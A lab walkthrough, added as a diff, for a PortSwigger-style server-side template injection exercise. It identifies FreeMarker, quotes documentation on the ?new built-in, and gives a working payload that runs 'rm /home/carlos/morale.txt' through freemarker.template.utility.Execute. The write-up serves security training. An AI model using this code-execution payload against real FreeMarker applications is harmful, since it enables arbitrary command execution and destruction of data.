@@ -1,0 +1,42 @@
+// Lab: Server-side template injection using documentation
+
+
+This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
+
+You can log in to your own account using the following credentials:
+
+content-manager:C0nt3ntM4n4g3r
+
+
+
+
+// Solution
+
+
+Taking reference from this research https://portswigger.net/research/server-side-template-injection  
+check the Freemaker template code:
+
+${7*7} → Freemarker/Groovy
+
+
+
+// Steps to solve
+
+
+1. Login using the credentials content-manager:C0nt3ntM4n4g3r and Go to amy blog page
+
+2. Inside the blog page there given the template to save and preview, Modify it with ${foobar} to check
+   the result 
+
+Ouput:
+
+/* The new built-in (Configuration.setNewBuiltinClassResolver, Environment.setNewBuiltinClassResolver): It's used in templates like "com.example.SomeClass"?new(), and is important for FTL libraries that are partially implemented in Java, but shouldn't be needed in normal templates. While new will not instantiate classes that are not TemplateModel-s, FreeMarker contains a TemplateModel class that can be used to create arbitrary Java objects. Other "dangerous" TemplateModel-s can exist in you class-path. Plus, even if a class doesn't implement TemplateModel, its static initialization will be run. To avoid these, you should use a TemplateClassResolver that restricts the accessible classes (possibly based on which template asks for them), such as TemplateClassResolver.ALLOWS_NOTHING_RESOLVER. */
+
+
+
+3. For the FreeMarker template injection we use the following code that delete the morale.txt file:
+
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }
+
+
+4. The lab will be solved.
